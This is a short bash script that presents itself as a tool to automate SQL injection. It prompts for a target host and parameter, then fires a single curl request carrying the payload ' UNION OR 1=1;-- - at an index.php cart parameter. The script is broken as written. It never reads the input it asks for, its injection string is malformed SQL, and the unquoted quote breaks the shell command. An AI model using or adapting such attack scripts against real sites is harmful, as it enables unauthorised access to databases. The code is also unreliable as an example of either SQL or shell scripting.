#!/bin/bash
# This is a script that is made to automate sql injections

echo "Enter the host info (ip/domain)" 
echo "Submit the the vulnerable/suspected parameter"

curl $host/index.php?cart=' UNION OR 1=1;-- -
